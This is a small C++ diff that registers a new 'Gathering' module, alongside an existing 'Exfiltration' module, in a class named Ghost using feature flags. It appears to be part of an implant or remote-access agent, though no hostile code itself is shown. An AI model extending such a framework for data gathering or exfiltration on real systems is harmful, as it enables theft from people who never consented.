@@ -16,6 +16,9 @@
 #ifdef FEATURE_EXFIL
     #include "modules/Exfiltration.hpp"
 #endif
+#ifdef FEATURE_GATHERING
+    #include "modules/Gathering.hpp"
+#endif
 
 using json = nlohmann::json;
 
@@ -28,6 +31,9 @@ Ghost::Ghost() {
     #endif
     #ifdef FEATURE_EXFIL
     modules["EXFIL"] = std::make_unique<Exfiltration>();
+    #endif
+    #ifdef FEATURE_GATHERING
+    modules["GATHERING"] = std::make_unique<Gathering>();
     #endif
 
     auto timestamp = std::chrono::system_clock::now().time_since_epoch().count();
